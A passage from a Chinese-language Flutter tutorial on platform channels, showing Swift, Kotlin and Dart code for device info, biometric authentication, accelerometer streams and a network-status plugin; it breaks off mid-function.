        <span class="hljs-comment">// 11. 设备信息字典</span>
        <span class="hljs-keyword">let</span> deviceInfo: [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] <span class="hljs-operator">=</span> [
            <span class="hljs-string">"name"</span>: device.name,
            <span class="hljs-string">"model"</span>: device.model,
            <span class="hljs-string">"systemName"</span>: device.systemName,
            <span class="hljs-string">"systemVersion"</span>: device.systemVersion,
            <span class="hljs-string">"identifierForVendor"</span>: device.identifierForVendor<span class="hljs-operator">?</span>.uuidString <span class="hljs-operator">??</span> <span class="hljs-string">""</span>,
            <span class="hljs-string">"batteryLevel"</span>: device.batteryLevel,
            <span class="hljs-string">"batteryState"</span>: <span class="hljs-string">"<span class="hljs-subst">\(device.batteryState)</span>"</span>,
            <span class="hljs-string">"isBatteryMonitoringEnabled"</span>: device.isBatteryMonitoringEnabled,
            <span class="hljs-string">"proximityState"</span>: device.proximityState,
            <span class="hljs-string">"isProximityMonitoringEnabled"</span>: device.isProximityMonitoringEnabled,
            <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"<span class="hljs-subst">\(device.orientation)</span>"</span>,
            <span class="hljs-string">"isMultitaskingSupported"</span>: device.isMultitaskingSupported,
            <span class="hljs-string">"userInterfaceIdiom"</span>: <span class="hljs-string">"<span class="hljs-subst">\(device.userInterfaceIdiom)</span>"</span>
        ]
        
        <span class="hljs-comment">// 12. 返回结果</span>
        result(deviceInfo)
    }
}
</code></pre>
<h5 data-id="heading-17">Dart侧代码</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ios_device_info.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IOSDeviceInfo</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/battery'</span>);
  
  <span class="hljs-comment">// 获取iOS设备信息</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; getDeviceInfo() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; info = 
          <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'getDeviceInfo'</span>);
      
      <span class="hljs-comment">// 转换为明确的类型</span>
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(info);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'获取设备信息失败: <span class="hljs-subst">${e.message}</span>'</span>);
      <span class="hljs-keyword">return</span> {};
    }
  }
  
  <span class="hljs-comment">// 获取电池电量</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">int</span>&gt; getBatteryLevel() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> level = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'getBatteryLevel'</span>);
      <span class="hljs-keyword">return</span> level;
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'获取电量失败: <span class="hljs-subst">${e.message}</span>'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
  }
}
</code></pre>
<h4 data-id="heading-18">3.3 iOS特有功能：使用Face ID/Touch ID</h4>
<p>iOS的生物识别是一个很好的平台特定功能示例：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// AppDelegate.swift 中添加</span>
<span class="hljs-keyword">import</span> LocalAuthentication

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">AppDelegate</span> {
    <span class="hljs-comment">// 生物识别验证</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">authenticateWithBiometrics</span>(<span class="hljs-params">result</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-keyword">let</span> context <span class="hljs-operator">=</span> <span class="hljs-type">LAContext</span>()
        <span class="hljs-keyword">var</span> error: <span class="hljs-type">NSError</span>?
        
        <span class="hljs-comment">// 1. 检查设备是否支持生物识别</span>
        <span class="hljs-keyword">if</span> context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: <span class="hljs-operator">&amp;</span>error) {
            <span class="hljs-keyword">let</span> reason <span class="hljs-operator">=</span> <span class="hljs-string">"请进行生物识别以继续"</span>
            
            <span class="hljs-comment">// 2. 执行验证</span>
            context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, 
                                  localizedReason: reason) { success, authenticationError <span class="hljs-keyword">in</span>
                <span class="hljs-comment">// 3. 主线程返回结果</span>
                <span class="hljs-type">DispatchQueue</span>.main.async {
                    <span class="hljs-keyword">if</span> success {
                        <span class="hljs-comment">// 4. 验证成功</span>
                        result([<span class="hljs-string">"success"</span>: <span class="hljs-literal">true</span>, <span class="hljs-string">"message"</span>: <span class="hljs-string">"验证成功"</span>])
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// 5. 验证失败</span>
                        <span class="hljs-keyword">let</span> errorMessage: <span class="hljs-type">String</span>
                        
                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> laError <span class="hljs-operator">=</span> authenticationError <span class="hljs-keyword">as?</span> <span class="hljs-type">LAError</span> {
                            <span class="hljs-keyword">switch</span> laError.code {
                            <span class="hljs-keyword">case</span> .userCancel:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"用户取消"</span>
                            <span class="hljs-keyword">case</span> .userFallback:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"用户选择使用密码"</span>
                            <span class="hljs-keyword">case</span> .authenticationFailed:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"验证失败"</span>
                            <span class="hljs-keyword">case</span> .passcodeNotSet:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未设置密码"</span>
                            <span class="hljs-keyword">case</span> .systemCancel:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"系统取消"</span>
                            <span class="hljs-keyword">case</span> .biometryNotAvailable:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"生物识别不可用"</span>
                            <span class="hljs-keyword">case</span> .biometryNotEnrolled:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未录入生物信息"</span>
                            <span class="hljs-keyword">case</span> .biometryLockout:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"生物识别被锁定"</span>
                            <span class="hljs-keyword">default</span>:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未知错误"</span>
                            }
                        } <span class="hljs-keyword">else</span> {
                            errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未知错误"</span>
                        }
                        
                        result(<span class="hljs-type">FlutterError</span>(
                            code: <span class="hljs-string">"AUTH_FAILED"</span>,
                            message: errorMessage,
                            details: <span class="hljs-literal">nil</span>
                        ))
                    }
                }
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 6. 设备不支持生物识别</span>
            <span class="hljs-keyword">let</span> errorMessage <span class="hljs-operator">=</span> error<span class="hljs-operator">?</span>.localizedDescription <span class="hljs-operator">??</span> <span class="hljs-string">"设备不支持生物识别"</span>
            result(<span class="hljs-type">FlutterError</span>(
                code: <span class="hljs-string">"NOT_SUPPORTED"</span>,
                message: errorMessage,
                details: <span class="hljs-literal">nil</span>
            ))
        }
    }
    
    <span class="hljs-comment">// 在setMethodCallHandler中添加</span>
    <span class="hljs-comment">// batteryChannel.setMethodCallHandler { [weak self] (call, result) in</span>
    <span class="hljs-comment">//     if call.method == "authenticateWithBiometrics" {</span>
    <span class="hljs-comment">//         self?.authenticateWithBiometrics(result: result)</span>
    <span class="hljs-comment">//     }</span>
    <span class="hljs-comment">// }</span>
}
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// dart侧</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BiometricAuth</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/battery'</span>);
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; authenticate() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'authenticateWithBiometrics'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(result);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-string">'success'</span>: <span class="hljs-keyword">false</span>,
        <span class="hljs-string">'message'</span>: e.message ?? <span class="hljs-string">'验证失败'</span>,
        <span class="hljs-string">'errorCode'</span>: e.code,
      };
    }
  }
}
</code></pre>
<h4 data-id="heading-19">3.4 iOS与Android的兼容性处理</h4>
<p>在实际插件开发中，我们经常需要处理平台之间差异：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 工具类</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlatformUtils</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isAndroid =&gt; Platform.isAndroid;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isIOS =&gt; Platform.isIOS;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isMobile =&gt; Platform.isAndroid || Platform.isIOS;
  
  <span class="hljs-comment">// 平台特定的提示</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showPlatformToast(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (isAndroid) {
      <span class="hljs-keyword">await</span> AndroidToast.showShort(message);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isIOS) {
      <span class="hljs-comment">// iOS没有Toast，使用其他方式</span>
      <span class="hljs-keyword">await</span> _showIOSToastLike(message);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// Web或桌面端</span>
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'Toast: <span class="hljs-subst">$message</span>'</span>);
    }
  }
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; _showIOSToastLike(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// iOS上可以使用其他方式模拟Toast</span>
    <span class="hljs-comment">// 比如使用SnackBar或自定义View</span>
  }
}
</code></pre>
<h3 data-id="heading-20">四、EventChannel</h3>
<p>如何实现从原生到Dart的持续数据流？</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph "Android/iOS原生侧"
        A[数据源&lt;br/&gt;传感器/位置/GPS] --&gt; B[EventChannel.EventSink]
        B --&gt; C[BinaryMessenger发送]
    end
    
    subgraph "Dart侧"
        C --&gt; D[StreamController]
        D --&gt; E[Stream]
        E --&gt; F[StreamBuilder/widget]
    end
    
    style B fill:#9f9
    style E fill:#f99
</code></pre>
<p><strong>关键组件</strong>：</p>
<ol>
<li><strong>EventSink</strong>：原生侧的数据发射器</li>
<li><strong>Stream</strong>：Dart侧的响应式数据流</li>
<li><strong>StreamHandler</strong>：连接两者的桥梁</li>
</ol>
<h4 data-id="heading-21">4.1 EventChannel与MethodChannel的区别</h4>



































<table><thead><tr><th>维度</th><th>MethodChannel</th><th>EventChannel</th></tr></thead><tbody><tr><td>通信方向</td><td>双向</td><td>主要是原生→Dart</td></tr><tr><td>通信模式</td><td>请求-响应</td><td>事件流/数据流</td></tr><tr><td>使用场景</td><td>方法调用</td><td>实时数据</td></tr><tr><td>连接状态</td><td>短连接</td><td>长连接</td></tr><tr><td>性能影响</td><td>每次调用都建立连接</td><td>一次建立，多次传输</td></tr></tbody></table>
<h4 data-id="heading-22">4.2 以监听传感器数据为例</h4>
<h5 data-id="heading-23">Android侧（Kotlin）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SensorEventPlugin.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SensorEventPlugin</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context) : 
    StreamHandler {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> sensorManager: SensorManager? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> accelerometerSensor: Sensor? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> eventSink: EventChannel.EventSink? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">registerWith</span><span class="hljs-params">(registrar: <span class="hljs-type">Registrar</span>)</span></span> {
            <span class="hljs-keyword">val</span> channel = EventChannel(
                registrar.messenger(), 
                <span class="hljs-string">"com.xxxx/sensor"</span>
            )
            <span class="hljs-keyword">val</span> plugin = SensorEventPlugin(registrar.context())
            channel.setStreamHandler(plugin)
        }
    }
    
    <span class="hljs-comment">// 1. 监听</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onListen</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?, events: <span class="hljs-type">EventChannel</span>.<span class="hljs-type">EventSink</span>?)</span></span> {
        eventSink = events
        
        <span class="hljs-comment">// 2. 初始化传感器</span>
        sensorManager = context.getSystemService(Context.SENSOR_SERVICE) <span class="hljs-keyword">as</span> SensorManager
        accelerometerSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        
        <span class="hljs-comment">// 3. 注册传感器监听器</span>
        sensorManager?.registerListener(
            sensorListener,
            accelerometerSensor,
            SensorManager.SENSOR_DELAY_NORMAL
        )
    }
    
    <span class="hljs-comment">// 4. 监听停止</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCancel</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?)</span></span> {
        <span class="hljs-comment">// 5. 取消传感器监听</span>
        sensorManager?.unregisterListener(sensorListener)
        sensorManager = <span class="hljs-literal">null</span>
        accelerometerSensor = <span class="hljs-literal">null</span>
        eventSink = <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// 6. 传感器监听器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> sensorListener = <span class="hljs-keyword">object</span> : SensorEventListener {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSensorChanged</span><span class="hljs-params">(event: <span class="hljs-type">SensorEvent</span>?)</span></span> {
            event?.let {
                <span class="hljs-comment">// 7. 获取加速度数据</span>
                <span class="hljs-keyword">val</span> x = it.values[<span class="hljs-number">0</span>]
                <span class="hljs-keyword">val</span> y = it.values[<span class="hljs-number">1</span>]
                <span class="hljs-keyword">val</span> z = it.values[<span class="hljs-number">2</span>]
                
                <span class="hljs-comment">// 8. 发送到Dart</span>
                eventSink?.success(mapOf(
                    <span class="hljs-string">"x"</span> to x,
                    <span class="hljs-string">"y"</span> to y,
                    <span class="hljs-string">"z"</span> to z,
                    <span class="hljs-string">"timestamp"</span> to System.currentTimeMillis()
                ))
            }
        }
        
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAccuracyChanged</span><span class="hljs-params">(sensor: <span class="hljs-type">Sensor</span>?, accuracy: <span class="hljs-type">Int</span>)</span></span> {
            <span class="hljs-comment">// .....</span>
        }
    }
}
</code></pre>
<h5 data-id="heading-24">Dart侧</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// sensor_stream.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SensorStream</span> </span>{
  <span class="hljs-keyword">final</span> EventChannel _channel = EventChannel(<span class="hljs-string">'com.xxxx/sensor'</span>);
  Stream&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt;? _stream;
  
  <span class="hljs-comment">// 获取传感器数据流</span>
  Stream&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; <span class="hljs-keyword">get</span> sensorStream {
    _stream ??= _channel
        .receiveBroadcastStream()
        .map((data) =&gt; <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(data));
    <span class="hljs-keyword">return</span> _stream!;
  }
  
  <span class="hljs-comment">// 使用</span>
  <span class="hljs-keyword">void</span> startListening() {
    sensorStream.listen((data) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'加速度: X=<span class="hljs-subst">${data[<span class="hljs-string">'x'</span>]}</span>, Y=<span class="hljs-subst">${data[<span class="hljs-string">'y'</span>]}</span>, Z=<span class="hljs-subst">${data[<span class="hljs-string">'z'</span>]}</span>'</span>);
      
      <span class="hljs-comment">// 计算设备倾斜角度</span>
      <span class="hljs-built_in">double</span> pitch = <span class="hljs-number">180</span> * atan(data[<span class="hljs-string">'x'</span>] / sqrt(pow(data[<span class="hljs-string">'y'</span>], <span class="hljs-number">2</span>) + pow(data[<span class="hljs-string">'z'</span>], <span class="hljs-number">2</span>))) / pi;
      <span class="hljs-built_in">double</span> roll = <span class="hljs-number">180</span> * atan(data[<span class="hljs-string">'y'</span>] / sqrt(pow(data[<span class="hljs-string">'x'</span>], <span class="hljs-number">2</span>) + pow(data[<span class="hljs-string">'z'</span>], <span class="hljs-number">2</span>))) / pi;
      
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'倾斜角度: Pitch=<span class="hljs-subst">$pitch</span>°, Roll=<span class="hljs-subst">$roll</span>°'</span>);
    }, onError: (error) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'传感器错误: <span class="hljs-subst">$error</span>'</span>);
    }, onDone: () {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'传感器监听结束'</span>);
    });
  }
  
  <span class="hljs-comment">// 在Widget中使用</span>
  Widget buildSensorWidget() {
    <span class="hljs-keyword">return</span> StreamBuilder&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt;(
      stream: sensorStream,
      builder: (context, snapshot) {
        <span class="hljs-keyword">if</span> (snapshot.hasData) {
          <span class="hljs-keyword">final</span> data = snapshot.data!;
          <span class="hljs-keyword">return</span> Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Text(<span class="hljs-string">'X: <span class="hljs-subst">${data[<span class="hljs-string">'x'</span>].toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>),
              Text(<span class="hljs-string">'Y: <span class="hljs-subst">${data[<span class="hljs-string">'y'</span>].toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>),
              Text(<span class="hljs-string">'Z: <span class="hljs-subst">${data[<span class="hljs-string">'z'</span>].toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>),
              <span class="hljs-comment">// 展示</span>
              CustomPaint(
                painter: AccelerometerPainter(data),
                size: Size(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>),
              ),
            ],
          );
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (snapshot.hasError) {
          <span class="hljs-keyword">return</span> Text(<span class="hljs-string">'error: <span class="hljs-subst">${snapshot.error}</span>'</span>);
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">return</span> CircularProgressIndicator();
        }
      },
    );
  }
}
</code></pre>
<p><strong>EventChannel实际应用场景如下：</strong></p>
<ul>
<li>加速度计、陀螺仪等</li>
<li>GPS位置实时变化</li>
<li>网络连接状态变化</li>
<li>蓝牙设备发现和数据接收</li>
<li>下载进度实时更新</li>
</ul>
<h3 data-id="heading-25">五、自定义插件</h3>
<h4 data-id="heading-26">5.1 插件项目结构</h4>
<p>一个标准的Flutter插件目录结构如下：</p>
<pre><code class="hljs language-bash" lang="bash">flutter_custom_plugin/
├── android/                     <span class="hljs-comment"># Android平台代码</span>
│   ├── build.gradle             <span class="hljs-comment"># Android构建配置</span>
│   ├── src/main/
│   │   ├── kotlin/
│   │   │   └── com/xxxx/flutter_custom_plugin/
│   │   │       └── FlutterCustomPlugin.kt
│   │   └── AndroidManifest.xml
├── ios/                       <span class="hljs-comment"># iOS平台代码</span>
│   ├── Classes/
│   │   └── FlutterCustomPlugin.swift
│   └── flutter_custom_plugin.podspec
├── lib/                       <span class="hljs-comment"># Dart库代码</span>
│   ├── flutter_custom_plugin.dart
│   └── src/
│       └── implementation.dart
├── xxxx/                   <span class="hljs-comment"># 案例应用</span>
│   ├── android/
│   ├── ios/
│   └── lib/main.dart
├── pubspec.yaml              <span class="hljs-comment"># 插件配置</span>
└── README.md                 <span class="hljs-comment"># 文档</span>
</code></pre>
<h4 data-id="heading-27">5.2 以网络状态监听插件为例</h4>
<h5 data-id="heading-28">第一步：创建插件项目</h5>
<pre><code class="hljs language-bash" lang="bash">flutter create --template=plugin --org=com.xxxx--platforms=android,ios flutter_network_plugin
<span class="hljs-built_in">cd</span> flutter_network_plugin
</code></pre>
<h5 data-id="heading-29">第二步：编写Dart API</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/flutter_network_plugin.dart</span>
<span class="hljs-keyword">library</span> flutter_network_plugin;

<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:async'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-comment">/// <span class="markdown">网络类型枚举</span></span>
<span class="hljs-keyword">enum</span> NetworkType {
  wifi,
  mobile,
  ethernet,
  bluetooth,
  vpn,
  none,
  unknown,
}

<span class="hljs-comment">/// <span class="markdown">网络状态类</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkStatus</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">bool</span> isConnected;
  <span class="hljs-keyword">final</span> NetworkType type;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> subtype;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">bool</span> isRoaming;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> extraInfo;
  
  NetworkStatus({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.isConnected,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.type,
    <span class="hljs-keyword">this</span>.subtype,
    <span class="hljs-keyword">this</span>.isRoaming = <span class="hljs-keyword">false</span>,
    <span class="hljs-keyword">this</span>.extraInfo,
  });
  
  <span class="hljs-comment">/// <span class="markdown">从Map转换</span></span>
  <span class="hljs-keyword">factory</span> NetworkStatus.fromMap(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; map) {
    <span class="hljs-keyword">return</span> NetworkStatus(
      isConnected: map[<span class="hljs-string">'isConnected'</span>] ?? <span class="hljs-keyword">false</span>,
      type: _parseNetworkType(map[<span class="hljs-string">'type'</span>]),
      subtype: map[<span class="hljs-string">'subtype'</span>],
      isRoaming: map[<span class="hljs-string">'isRoaming'</span>] ?? <span class="hljs-keyword">false</span>,
      extraInfo: map[<span class="hljs-string">'extraInfo'</span>],
    );
  }
  
  <span class="hljs-comment">/// <span class="markdown">转换为Map</span></span>
  <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; toMap() {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-string">'isConnected'</span>: isConnected,
      <span class="hljs-string">'type'</span>: type.toString().split(<span class="hljs-string">'.'</span>).last,
      <span class="hljs-string">'subtype'</span>: subtype,
      <span class="hljs-string">'isRoaming'</span>: isRoaming,
      <span class="hljs-string">'extraInfo'</span>: extraInfo,
    };
  }
  
  <span class="hljs-comment">/// <span class="markdown">解析网络类型</span></span>
  <span class="hljs-keyword">static</span> NetworkType _parseNetworkType(<span class="hljs-built_in">String?</span> type) {
    <span class="hljs-keyword">switch</span> (type?.toLowerCase()) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'wifi'</span>:
        <span class="hljs-keyword">return</span> NetworkType.wifi;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'mobile'</span>:
        <span class="hljs-keyword">return</span> NetworkType.mobile;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'ethernet'</span>:
        <span class="hljs-keyword">return</span> NetworkType.ethernet;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'bluetooth'</span>:
        <span class="hljs-keyword">return</span> NetworkType.bluetooth;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'vpn'</span>:
        <span class="hljs-keyword">return</span> NetworkType.vpn;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'none'</span>:
        <span class="hljs-keyword">return</span> NetworkType.none;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> NetworkType.unknown;
    }
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">String</span> toString() {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'NetworkStatus{isConnected: <span class="hljs-subst">$isConnected</span>, type: <span class="hljs-subst">$type</span>, subtype: <span class="hljs-subst">$subtype</span>}'</span>;
  }
}

<span class="hljs-comment">/// <span class="markdown">网络状态插件</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlutterNetworkPlugin</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _methodChannel =
      MethodChannel(<span class="hljs-string">'flutter_network_plugin/method'</span>);
  
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> EventChannel _eventChannel =
      EventChannel(<span class="hljs-string">'flutter_network_plugin/event'</span>);
  
  <span class="hljs-comment">/// <span class="markdown">单例</span></span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> FlutterNetworkPlugin _instance = FlutterNetworkPlugin._internal();
  <span class="hljs-keyword">factory</span> FlutterNetworkPlugin() =&gt; _instance;
  FlutterNetworkPlugin._internal();
  
  <span class="hljs-comment">/// <span class="markdown">获取当前网络状态</span></span>
  <span class="hljs-keyword">static</span> Future&lt;NetworkStatus&gt; <span class="hljs-keyword">get</span> currentStatus <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; status =
          <span class="hljs-keyword">await</span> _methodChannel.invokeMethod(<span class="hljs-string">'getCurrentStatus'</span>);
      <span class="hljs-keyword">return</span> NetworkStatus.fromMap(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(status));
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'获取网络状态失败: <span class="hljs-subst">${e.message}</span>'</span>);
      <span class="hljs-keyword">return</span> NetworkStatus(
        isConnected: <span class="hljs-keyword">false</span>,
        type: NetworkType.unknown,
      );
    }
  }
  
  <span class="hljs-comment">/// <span class="markdown">检查是否有网络连接</span></span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">bool</span>&gt; <span class="hljs-keyword">get</span> isConnected <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> currentStatus;
    <span class="hljs-keyword">return</span> status.isConnected;
  }
  
  <span class="hljs-comment">/// <span class="markdown">网络状态变化流</span></span>
  <span class="hljs-keyword">static</span> Stream&lt;NetworkStatus&gt; <span class="hljs-keyword">get</span> onStatusChanged {
    <span class="hljs-keyword">return</span> _eventChannel
        .receiveBroadcastStream()
        .map((data) =&gt; NetworkStatus.fromMap(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(data)))
        .handleError((error) {
          <span class="hljs-built_in">print</span>(<span class="hljs-string">'网络状态监听错误: <span class="hljs-subst">$error</span>'</span>);
        });
  }
  
  <span class="hljs-comment">/// <span class="markdown">初始化插件</span></span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; initialize() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
